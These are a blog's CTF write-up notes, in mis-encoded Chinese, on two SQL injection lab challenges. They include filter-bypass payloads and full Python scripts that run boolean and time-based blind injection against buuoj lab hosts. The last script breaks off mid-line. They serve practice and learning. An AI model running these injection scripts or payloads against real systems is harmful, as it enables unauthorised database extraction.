<h2 id="title-note-21date-2025-04-06-01-47-37tags-sql"><a href="#title-note-21date-2025-04-06-01-47-37tags-sql" class="headerlink" title="title: note-21date: 2025-04-06 01:47:37tags: sql"></a>title: note-21<br>date: 2025-04-06 01:47:37<br>tags: sql</h2><h1 id="GYCTF2020-Ezsqli-1"><a href="#GYCTF2020-Ezsqli-1" class="headerlink" title="[GYCTF2020]Ezsqli 1"></a>[GYCTF2020]Ezsqli 1</h1><p>fuzzæ²¡fuzzæ‡‚ï¼Œçœ‹åˆ«äººwpæ˜¯æ•°å­—å‹æ³¨å…¥<br>bpå‡ºorå’Œandè¢«è¿‡æ»¤äº†ï¼Œæ²¡å›æ˜¾ï¼Œé‚£å°±æ˜¯ç›²æ³¨äº†<br>çœ‹åˆ«äººwpæ˜¯ç”¨ ^ ä»£æ›¿ or , &amp;&amp; ä»£æ›¿ and<br>æµ‹è¯•æ˜¯å¦æœ‰å›æ˜¾ï¼š</p>
<figure class="highlight m"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs m"><span class="hljs-number">1</span>&amp;&amp;length(database())&gt;<span class="hljs-number">0</span><br><span class="hljs-number">1</span>&amp;&amp;length(database())&lt;<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
<p>ç„¶åæµ‹è¯•substrå’Œasciiæ˜¯å¦è¢«è¿‡æ»¤ï¼š</p>
<figure class="highlight m"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs m"><span class="hljs-number">1</span>&amp;&amp;ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">0</span><br><span class="hljs-number">1</span>&amp;&amp;ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
<p>å†™è„šæœ¬æ±‚æ•°æ®åº“é•¿åº¦å’Œåå­—ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;_-&#125;&#123;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>url = <span class="hljs-string">&#x27;http://c2a220ad-23f1-4a7a-82c0-73eeafd4d980.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="hljs-comment"># 1&amp;&amp;ascii(substr(database(),1,1))=</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    payload = <span class="hljs-string">&#x27;1&amp;&amp;length(database())=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(l)<br>    data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>    re = requests.post(url,data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;testing æ•°æ®åº“é•¿åº¦:&quot;</span>,l)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ•°æ®åº“é•¿åº¦:&quot;</span>,l)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,l+<span class="hljs-number">1</span>) :<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        payload = <span class="hljs-string">&quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="hljs-built_in">format</span>(i,s)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            database_name=database_name + s<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¬¬&quot;</span>,i,<span class="hljs-string">&quot;ä¸ªå­—ç¬¦ï¼š &quot;</span>,database_name)<br>            <span class="hljs-keyword">break</span> <br></code></pre></td></tr></table></figure>
<blockquote>
<p>è·å–åˆ°æ•°æ®åº“ä¿¡æ¯ä¹‹åå¼€å§‹è·å–æ•°æ®åº“å†…çš„è¡¨åï¼Œåœ¨æµ‹è¯•çš„æ—¶å€™å‘ç°information_schemaè¢«è¿‡æ»¤äº†ï¼Œé‚£å°±å°è¯•ä¸‹mysql.innodb_table_stats(mysqlé»˜è®¤å…³é—­InnoDBå­˜å‚¨å¼•æ“)ä¸€æ ·ä¸è¡Œï¼Œé‚£å°±åªèƒ½ç™¾åº¦äº†ï¼Œçœ‹ç½‘ä¸Šé‡‡ç”¨çš„æ˜¯sys.x$schema_flattened_keysï¼ˆéœ€è¦ç‰ˆæœ¬&gt;5.7ä¸”åªèƒ½æŸ¥è¯¢è¡¨æ˜ï¼Œä½¿ç”¨æ–¹æ³•ä¸information_schemaç±»ä¼¼ï¼‰  </p>
</blockquote>
<p>æˆ‘è¿™ä¸ªç¯å¢ƒåªæœ‰sys.x$schema_flattened_keysèƒ½ç”¨ï¼Œæœ‰çš„wpç”¨sys.schema_table_statistics_with_bufferï¼Œæˆ‘è¿™æ²¡æµ‹å‡ºæ¥<br>æ±‚è¡¨å(å†™è¿™æ­¥å¡äº†æˆ‘ä¸€ä¸ªå°æ—¶):</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;,-./0123456789:;&lt;&gt;=?@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`&#123;|&#125;~#&#x27;</span><br>url = <span class="hljs-string">&#x27;http://72f05b95-5f5b-4315-94d1-fb6b35544ce8.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="hljs-comment"># 1&amp;&amp;ascii(substr(database(),1,1))=</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br>name=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># for l in range (1,100):</span><br><span class="hljs-comment">#     payload = &#x27;1&amp;&amp;length(database())=&#123;&#125;&#x27;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;testing æ•°æ®åº“é•¿åº¦:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;æ•°æ®åº“é•¿åº¦:&quot;,l)</span><br><span class="hljs-comment">#         break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;ç¬¬&quot;,i,&quot;ä¸ªå­—ç¬¦ï¼š &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    time.sleep(<span class="hljs-number">0.05</span>) <br>    payload = <span class="hljs-string">&quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;</span>.<span class="hljs-built_in">format</span>(l)<br>    data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>    re = requests.post(url,data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¡¨åé•¿åº¦:&quot;</span>,l)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å…¨è¡¨åé•¿åº¦:&quot;</span>,l)<br>        <span class="hljs-keyword">break</span> <br>    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,l+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        time.sleep(<span class="hljs-number">0.05</span>) <br>        payload = <span class="hljs-string">&quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;</span>.<span class="hljs-built_in">format</span>(i,s)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            name=name + s<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¡¨å:&quot;</span>,name)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<p>åˆ°æ±‚åˆ—åï¼Œå› ä¸ºinformation_schemaè¢«è¿‡æ»¤ï¼Œsys.schema_table_statistics_with_bufferåˆå¹¶æ²¡æœ‰å‚¨å­˜åˆ—åï¼Œå¹¶ä¸”è¿™é‡Œè¿‡æ»¤äº† union æ‰€ä»¥æˆ‘ä»¬æ— æ³•ä½¿ç”¨å¸¸è§„çš„<strong>æ— åˆ—åæ³¨å…¥</strong><br>å¦‚</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>;<br></code></pre></td></tr></table></figure>
<p>æ›´è¯¦ç»†<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_71467825/article/details/134655702">https://blog.csdn.net/qq_71467825/article/details/134655702</a></p>
<p>å…ˆåˆ¤æ–­è¡¨çš„åˆ—æ•°</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-number">1</span>&amp;&amp;((<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>) &gt; (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> f1ag_1s_h3r3_hhhhh))<br></code></pre></td></tr></table></figure>
<p>çŸ¥é“åˆ—æ•°ä¸º2ï¼Œé‚£ç¬¬ä¸€åˆ—å¤§æ¦‚ç‡æ˜¯idæˆ–åºåˆ—å·å•¥çš„ï¼ŒçŒœæµ‹flagåœ¨2  </p>
<p>ä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥ç”¨ç›²æ³¨å‘¢ï¼Œåº”è¯¥æ˜¯ä»¥ä¸ºæ²¡æ³•ç”¨selec group_concat(åˆ—å)ï¼Œå› ä¸ºæ²¡æœ‰èƒ½æŸ¥åˆ—åçš„è¡¨ï¼Œæ‰€ä»¥ä¸çŸ¥é“åˆ—åã€‚</p>
<p>é‚£çœ‹å¤§ä½¬ä»¬çš„wpï¼Œå°±æ˜¯ç”¨æ¯”å¤§å°ï¼Œasciiç å¤§çš„å°±å¤§ã€‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> &quot;a&quot;)  <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> &quot;abcdef&quot;)<br> <br><span class="hljs-number">0</span><br> <br> <br> <br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> &quot;b&quot;)  <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> &quot;abcdef&quot;)<br> <br><span class="hljs-number">1</span><br> <br>è¿™é‡Œèƒ½å‘ç° æ˜¯é€šè¿‡æ¯”å¯¹ é¦–ä¸ªå­—ç¬¦çš„ascii å¦‚æœç›¸åŒ å°±è¾“å‡º <span class="hljs-number">0</span> <br><br>ä¸åŒå°±è¾“å‡º <span class="hljs-number">1</span><br> å‰ä¸€ä¸ª ascii  å’Œ åä¸€ä¸ªascii å€¼çš„å¤§å°<br> å¦‚æœå‰ä¸€ä¸ªæ¯”è¾ƒå¤§ é‚£ä¹ˆå°±è¾“å‡º<span class="hljs-number">0</span><br><br>https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>kinsey973.github.io<span class="hljs-operator">/</span><span class="hljs-number">2024</span><span class="hljs-operator">/</span><span class="hljs-number">06</span><span class="hljs-operator">/</span><span class="hljs-number">08</span><span class="hljs-operator">/</span>GYCTF2020<span class="hljs-operator">-</span>Ezsqli<span class="hljs-operator">/</span><br></code></pre></td></tr></table></figure>
<p>åˆ©ç”¨è¯¥æ–¹æ³•æ‹¿åˆ°flag</p>
<p>æœ€åçš„è„šæœ¬åˆå†™äº†ä¸€ä¸ªå°æ—¶ï¼Œæƒ³æ­»äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;-./0123456789:;&lt;&gt;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~#&#x27;</span><br>url = <span class="hljs-string">&#x27;http://39c20ccd-935c-44d7-9446-f5fb806c3f12.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="hljs-comment"># 1&amp;&amp;ascii(substr(database(),1,1))=</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br>name=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># for l in range (1,100):</span><br><span class="hljs-comment">#     payload = &#x27;1&amp;&amp;length(database())=&#123;&#125;&#x27;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;testing æ•°æ®åº“é•¿åº¦:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;æ•°æ®åº“é•¿åº¦:&quot;,l)</span><br><span class="hljs-comment">#         break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;ç¬¬&quot;,i,&quot;ä¸ªå­—ç¬¦ï¼š &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-comment"># for l in range (1,1000):</span><br><span class="hljs-comment">#     time.sleep(0.05) </span><br><span class="hljs-comment">#     payload = &quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;è¡¨åé•¿åº¦:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;å…¨è¡¨åé•¿åº¦:&quot;,l)</span><br><span class="hljs-comment">#         break </span><br>    <br><span class="hljs-comment"># for i in range (1,l+1):</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         time.sleep(0.05) </span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             name=name + s</span><br><span class="hljs-comment">#             print(&quot;è¡¨å:&quot;,name)</span><br><span class="hljs-comment">#             break</span><br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>):<br>    f=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        time.sleep(<span class="hljs-number">0.08</span>)<br>        f=flag + <span class="hljs-built_in">chr</span>(s)<br>        payload = <span class="hljs-string">&#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="hljs-built_in">format</span>(f)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            flag=flag + <span class="hljs-built_in">chr</span>(s-<span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">print</span>(flag.lower)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<p>æœ€åå‡ºæ¥çš„flagå…¨æ˜¯å¤§å†™ï¼Œæˆ‘çœ‹åˆ«äººçš„wpä¹Ÿæ˜¯å¤§å†™è¦è½¬å°å†™ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› </p>
<p>ç»“æŸ  </p>
<p>ä¸€é“é¢˜çœ‹ç€åˆ«äººçš„wpå¤ç°äº†è¿‘3ä¸ªåŠå°æ—¶ï¼Œèœçš„å‘ç˜Ÿï¼Œå†™è„šæœ¬è„‘å­è·Ÿä¸ä¸Šï¼Œåšé¢˜èµ·æ­¥éš¾æ²¡ç»éªŒï¼Œåˆ°åº•å“ªå¤©èƒ½ç‹¬ç«‹è§£å‡ºä¸€é“è¿™ç§webé¢˜å•Š<br>&#x2F;&#x2F;<br>&#x2F;&#x2F;<br>&#x2F;&#x2F;</p>
<p>å¤ç°çš„wp:<br><a target="_blank" rel="noopener" href="https://kinsey973.github.io/2024/06/08/GYCTF2020-Ezsqli/">https://kinsey973.github.io/2024/06/08/GYCTF2020-Ezsqli/</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/upfine/p/16556520.html">https://www.cnblogs.com/upfine/p/16556520.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/fmyyy1/article/details/115447291">https://blog.csdn.net/fmyyy1/article/details/115447291</a></p>
<hr>
<h2 id="title-note-22date-2025-04-09-15-53-17tags-sql"><a href="#title-note-22date-2025-04-09-15-53-17tags-sql" class="headerlink" title="title: note-22date: 2025-04-09 15:53:17tags: sql"></a>title: note-22<br>date: 2025-04-09 15:53:17<br>tags: sql</h2><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-midsql"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-midsql" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]midsql"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]midsql</h1><p>çœ‹äº†wpï¼Œåªèƒ½è¯´fuzzè¿‡ç¨‹åº”è¯¥æ˜¯æœ€é‡è¦çš„ï¼Œä¸ç„¶fuzzéƒ½fuzzä¸æ˜ç™½å®Œå…¨ä¸çŸ¥é“ä¸‹ä¸€æ­¥è¯¥å¹²å˜›<br>ä¹Ÿè®¸æˆ‘è®°å¾—ä¸€äº›æ³¨å…¥æ–¹æ³•ï¼Œä½†æ˜¯å¦‚æœè¿æ³¨å…¥ç‚¹æˆ–è€…æ³¨å…¥æ–¹å¼éƒ½fuzzä¸å‡ºæ¥ä¹Ÿæ˜¯å®Œå…¨æ²¡ç”¨<br>çœ‹äº†wpåå‘ç°åŸç†éƒ½æ‡‚ï¼Œé‚£ä¸ºä»€ä¹ˆæ€»æ˜¯è¦çœ‹wpæ‰èƒ½å†™å‡ºé¢˜ç›®ï¼Ÿ<br>å°±æ˜¯ä¸ä¼šfuzzï¼Œ<br>è‡ªå·±å†™çš„è„šæœ¬ï¼š  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>start=<span class="hljs-number">0</span><br>end=<span class="hljs-number">0</span><br>using=<span class="hljs-number">0</span><br>st = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&amp;\()*&#x27; +,-./:;&quot;</span><br>flag =<span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&quot;http://9f146922-110f-45e5-a8b6-4b6fffbce466.node5.buuoj.cn:81/?id=&#x27;if(length(database())like(&#123;&#125;),sleep(3),1)&quot;</span><br><span class="hljs-comment"># for l in range (1,200):</span><br><span class="hljs-comment">#     url = &quot;http://758d4b32-13c8-42cc-9228-a7fe9aa9ffaf.node5.buuoj.cn:81/?id=if(length(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_name/**/like&#x27;items&#x27;)like/**/&#123;&#125;,sleep(3),1)&quot;.format(l)</span><br><span class="hljs-comment">#     start=time.time()</span><br><span class="hljs-comment">#     requests.get(url)</span><br><span class="hljs-comment">#     end=time.time()</span><br><span class="hljs-comment">#     using = end - start</span><br><span class="hljs-comment">#     if using &gt; 3:</span><br><span class="hljs-comment">#         print(&quot;tables length=&quot;,l,&quot;using time=&quot;,using)</span><br><span class="hljs-comment">#         time.sleep(5)</span><br><span class="hljs-comment">#         break</span><br><span class="hljs-comment">#     print(&quot;using time=&quot;,using)</span><br><span class="hljs-comment">#     time.sleep(0.05)</span><br><br><span class="hljs-comment"># for i in range(1,100):</span><br><span class="hljs-comment">#     for s in st :</span><br><span class="hljs-comment">#         url= &quot;http://758d4b32-13c8-42cc-9228-a7fe9aa9ffaf.node5.buuoj.cn:81/?id=if(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like&#x27;items&#x27;),&#123;&#125;,1)like(&#x27;&#123;&#125;&#x27;),sleep(3),1)&quot;.format(i,s)</span><br><span class="hljs-comment">#         start=time.time()</span><br><span class="hljs-comment">#         requests.get(url)</span><br><span class="hljs-comment">#         end=time.time()</span><br><span class="hljs-comment">#         using= end - start</span><br><span class="hljs-comment">#         if using &gt; 3:</span><br><span class="hljs-comment">#             flag=flag + s</span><br><span class="hljs-comment">#             print(&quot;tables name=&quot;,flag,&quot;using time=&quot;,using)</span><br><span class="hljs-comment">#             r=1</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#         print(&quot;using time=&quot;,using,&quot;string:&quot;,s)</span><br><span class="hljs-comment">#         time.sleep(0.05)</span><br><span class="hljs-comment">#         print(flag)</span><br><span class="hljs-comment">#         r=0</span><br><span class="hljs-comment">#     if r == 0:</span><br><span class="hljs-comment">#         break</span><br><br><span class="hljs-comment">#id,name,price</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">177</span>) :<br>        url= <span class="hljs-string">&quot;http://758d4b32-13c8-42cc-9228-a7fe9aa9ffaf.node5.buuoj.cn:81/?id=if(ascii(substr((select/**/group_concat(name)/**/from/**/items),&#123;&#125;,1))like(&#x27;&#123;&#125;&#x27;),sleep(2),1)&quot;</span>.<span class="hljs-built_in">format</span>(i,s)<br>        